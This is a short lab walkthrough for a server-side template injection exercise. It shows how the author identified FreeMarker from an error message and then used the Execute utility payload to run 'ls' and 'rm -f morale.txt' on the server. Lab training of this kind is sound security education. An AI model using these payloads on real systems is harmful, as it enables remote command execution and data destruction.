Title: Server-side template injection using documentation
Level: Practitioner
Desc:  
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r


Walkthrough:
I provided template in post edition: `${T(java.lang.System).getenv()}` and it gives me an error:

![image](https://github.com/user-attachments/assets/6bef0470-65ee-4cb7-b26b-4ee4db56333e)

But now I can see, that app use Freemaker template engine.


I find out, that to list files using Freemaker engine I need to use this code: `${"freemarker.template.utility.Execute"?new()("ls")}`

So next step is:  `${"freemarker.template.utility.Execute"?new()("rm -f morale.txt")}`
